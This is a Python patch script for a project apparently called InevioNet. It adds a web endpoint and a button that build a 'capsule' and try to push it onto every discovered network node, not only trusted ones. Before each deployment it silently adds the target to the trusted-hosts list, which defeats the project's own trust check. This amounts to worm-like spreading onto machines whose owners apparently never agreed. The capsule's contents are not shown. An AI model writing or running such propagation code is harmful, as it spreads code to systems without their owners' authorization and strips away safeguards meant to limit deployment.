# patch20.py - deploy to all discovered nodes
import os
import ast
import shutil
import sys

ROOT = r"E:\InevioNet"
APP = os.path.join(ROOT, "web", "app.py")
HTML = os.path.join(ROOT, "web", "templates", "index.html")


def backup(path):
    shutil.copy2(path, path + ".bak_p20")
    print(f"  Backup: {os.path.basename(path)}.bak_p20")


def save_py(path, code):
    with open(path, "w", encoding="utf-8") as f:
        f.write(code)
    try:
        ast.parse(code)
        print(f"  [OK] syntax: {os.path.basename(path)}")
    except SyntaxError as e:
        print(f"  [!!] syntax error: {e}")
        shutil.copy2(path + ".bak_p20", path)
        sys.exit(1)


def save_raw(path, code):
    with open(path, "w", encoding="utf-8") as f:
        f.write(code)
    print(f"  [OK] saved: {os.path.basename(path)}")


# ============================================================
# 1. app.py: new endpoint /api/capsule/deploy_all
# ============================================================
print("=" * 70)
print("  PATCH 20a: app.py — deploy_all endpoint")
print("=" * 70)

backup(APP)
with open(APP, "r", encoding="utf-8") as f:
    app = f.read()

if "/api/capsule/deploy_all" in app:
    print("  [--] deploy_all already exists")
else:
    endpoint = '''
@app.route('/api/capsule/deploy_all', methods=['POST'])
def api_capsule_deploy_all():
    """P20: deploy to ALL discovered nodes (try each)."""
    try:
        n = get_net()
        if not hasattr(n, 'capsule_builder'):
            return jsonify({'success': False, 'error': 'no_capsule'}), 500

        # Build capsule once
        try:
            code = n.capsule_builder.build_minimal()
        except Exception as e:
            return jsonify({'success': False, 'error': 'build_failed: ' + str(e)}), 500

        # Get all nodes
        nodes = snapshot()
        results = []
        deployed_count = 0
        skipped_count = 0
        failed_count = 0

        # Types that CANNOT be deployed to
        no_os_types = {'wifi', 'bluetooth', 'ble', 'cellular', 'spore', 'super', 'industrial'}

        for nid, node in nodes.items():
            ntype = node.get('type', 'unknown')
            ip = node.get('ip', '')

            # Skip self
            if ntype == 'self':
                continue

            # Skip no-OS nodes
            if ntype in no_os_types:
                skipped_count += 1
                continue

            # Skip unknown IP
            if not ip or ip == 'unknown':
                skipped_count += 1
                continue

            # Try deploy
            target = ip
            port = node.get('port', 0)
            if port:
                target = f"{ip}:{port}"

            # Add as trusted temporarily? No — use direct deploy
            # Add to trusted for this call
            try:
                n.trusted_hosts.add(target, label=nid, method='auto')
            except Exception:
                pass

            try:
                ok = n.capsule_deployer.deploy(target, code, method='auto')
                if ok:
                    deployed_count += 1
                    results.append({
                        'node_id': nid,
                        'target': target,
                        'type': ntype,
                        'status': 'deployed',
                    })
                else:
                    failed_count += 1
                    results.append({
                        'node_id': nid,
                        'target': target,
                        'type': ntype,
                        'status': 'failed',
                    })
            except Exception as e:
                failed_count += 1
                results.append({
                    'node_id': nid,
                    'target': target,
                    'type': ntype,
                    'status': 'error',
                    'error': str(e),
                })

        log.info('[DeployAll] deployed=%d failed=%d skipped=%d',
                 deployed_count, failed_count, skipped_count)

        return jsonify({
            'success': True,
            'deployed': deployed_count,
            'failed': failed_count,
            'skipped': skipped_count,
            'results': results,
            'total_nodes': len(nodes),
        })
    except Exception as e:
        log.error('[DeployAll] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


'''
    marker = "@socketio.on('connect')"
    if marker in app:
        app = app.replace(marker, endpoint + marker, 1)
        save_py(APP, app)
        print("  [OK] deploy_all endpoint added")
    else:
        print("  [!!] socketio marker not found")


# ============================================================
# 2. index.html: new JS + button
# ============================================================
print()
print("=" * 70)
print("  PATCH 20b: index.html — deploy_all UI")
print("=" * 70)

backup(HTML)
with open(HTML, "r", encoding="utf-8") as f:
    html = f.read()

if "btnDeployAllNodes" in html:
    print("  [--] deploy_all button exists")
else:
    # Replace "Развернуть на всех" button
    old_btn = '''<button class="btn btn-success" onclick="deployAll()">🌐 Развернуть на всех</button>'''
    new_btn = '''<button class="btn btn-success" onclick="deployAllNodes()">🌐 Развернуть на ВСЕ найденные узлы</button>
<button class="btn btn-glass" onclick="deployAll()">📋 Развернуть на доверенные</button>'''
    if old_btn in html:
        html = html.replace(old_btn, new_btn, 1)
        print("  [OK] buttons replaced")

    # Add JS
    js = '''
async function deployAllNodes() {
    if (!confirm('Попробовать развернуть капсулу на ВСЕ найденные узлы?')) return;
    addLog('Deploy to ALL nodes...', 'warn');
    try {
        const r = await fetch('/api/capsule/deploy_all', { method: 'POST' });
        const d = await r.json();
        if (d.success) {
            addLog('Deployed: ' + d.deployed +
                   ' | Failed: ' + d.failed +
                   ' | Skipped: ' + d.skipped, 'success');
            // Show results
            const el = document.getElementById('capsuleList');
            if (el) {
                let out = '<div style="margin-top:10px">';
                out += '<b>Результаты:</b><br>';
                for (const res of (d.results || [])) {
                    const icon = res.status === 'deployed' ? '✅' :
                                 res.status === 'failed' ? '❌' : '⚠️';
                    out += icon + ' ' + res.type + ' @ ' + res.target + '<br>';
                }
                out += '</div>';
                el.innerHTML = out + el.innerHTML;
            }
        } else {
            addLog('Deploy all error: ' + (d.error || '?'), 'error');
        }
    } catch (e) {
        addLog('Deploy all: ' + e, 'error');
    }
}

'''
    js_marker = "checkAuth();"
    if js_marker in html:
        html = html.replace(js_marker, js + '\n' + js_marker, 1)
        print("  [OK] deployAllNodes JS added")

    save_raw(HTML, html)


print()
print("=" * 70)
print("  PATCH 20 DONE")
print("=" * 70)
print()
print("Что изменилось:")
print("  [OK] /api/capsule/deploy_all — deploy на все найденные узлы")
print("  [OK] UI: кнопка 🌐 Развернуть на ВСЕ найденные узлы")
print("  [OK] UI: кнопка 📋 Развернуть на доверенные (старая)")
print()
print("Перезапусти сервер: python -m web.app")